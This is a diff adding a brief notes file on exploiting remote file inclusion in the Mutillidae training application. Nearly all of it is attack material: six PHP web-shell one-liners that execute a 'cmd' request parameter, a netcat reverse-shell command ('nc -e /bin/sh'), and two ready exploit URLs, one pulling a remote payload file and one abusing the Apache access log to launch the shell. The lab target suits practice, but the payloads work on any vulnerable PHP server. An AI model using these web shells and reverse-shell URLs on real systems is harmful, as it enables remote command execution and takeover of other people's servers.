@@ -1,0 +1,16 @@
+Host of remote file server
+
+<?php echo shell_exec(escapeshellcmd($_REQUEST['cmd']));?>
+<?php echo exec(escapeshellcmd($_REQUEST['cmd']));?>
+<?php echo system(escapeshellcmd($_REQUEST['cmd']));?>
+<?php echo passthru(escapeshellcmd($_REQUEST['cmd']));?>
+<?php echo fread(popen(escapeshellcmd($_REQUEST['cmd']),'r'),1024);?>
+<?php $c = escapeshellcmd($_REQUEST['cmd']);echo `$c`; ?>
+
+Example cmd: 
+	ls
+	nc -e /bin/sh 127.0.0.1 81
+	
+URL: http://mutillidae.local/index.php?page=http://127.0.0.1:81/rfi.txt&cmd=ls
+URL: http://mutillidae.local/index.php?page=/var/log/apache2/localhost-access.log&cmd=/usr/bin/nc%20-e%20/bin/sh%20127.0.0.1%2081
+
